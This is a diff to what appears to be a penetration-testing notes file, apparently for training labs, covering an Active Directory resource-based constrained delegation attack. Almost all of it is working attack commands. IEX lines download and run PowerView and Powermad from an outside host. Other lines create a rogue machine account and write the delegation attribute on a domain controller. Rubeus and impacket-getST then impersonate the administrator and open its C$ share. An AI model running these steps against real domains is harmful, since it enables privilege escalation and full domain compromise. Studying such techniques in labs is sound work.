@@ -1201,13 +1201,13 @@ https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resou
 IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.37/PowerView.ps1')
 IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.37/Powermad.ps1')
 
-New-MachineAccount -MachineAccount TEST -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose 
+New-MachineAccount -MachineAccount TEST -Password $(ConvertTo-SecureString 'Pass12345!' -AsPlainText -Force) -Verbose 
 
 Get-DomainComputer TEST
 
 wget https://raw.githubusercontent.com/tothi/rbcd-attack/master/rbcd.py
 python3 rbcd.py -dc-ip 192.168.171.175 -t RESOURCEDC -f 'TEST' -hashes :19a3a7550ce8c505c2d46b5e39d6f808 resourced\\l.livingstone
-impacket-getST -spn cifs/ResourceDC.resourced.local resourced.local/TEST\$:'123456' -impersonate administrator -dc-ip 192.168.171.175
+impacket-getST -spn cifs/ResourceDC.resourced.local resourced.local/TEST\$:'Pass12345!' -impersonate administrator -dc-ip 192.168.171.175
 export KRB5CCNAME=./Administrator.ccache
 
 
@@ -1215,10 +1215,17 @@ $ComputerSid = Get-DomainComputer TEST -Properties objectsid | Select -Expand ob
 $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
 $SDBytes = New-Object byte[] ($SD.BinaryLength)
 $SD.GetBinaryForm($SDBytes, 0)
-Get-DomainComputer TEST | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
+Get-DomainComputer DC01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
 
-.\Rubeus.exe hash /user:TEST$ /password:123456 /domain:authority.htb
-.\Rubeus.exe s4u /user:TEST$ /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:administrator /msdsspn:cifs/TEST.resourced.local /ptt /domain:resourced.local /nowrap /altservice:cifs,host,ldap,http
+# RBCD User etc GenericWrite
+$credentials2 = New-Object System.Management.Automation.PSCredential "resourced\rbcd_user", (ConvertTo-SecureString 'rbcd_pass' -AsPlainText -Force)
+Get-DomainComputer DC01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose -Credential $credentials2
+
+.\Rubeus.exe hash /user:TEST$ /password:'Pass12345!' /domain:resourced.local
+.\Rubeus.exe s4u /user:TEST$ /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:administrator /msdsspn:cifs/dc01.resourced.local /ptt /nowrap /altservice:host,ldap,http,winrm,cifs
+
+klist
+ls \\msdsspn_fqdn\c$
 ```
 
 #### nopac
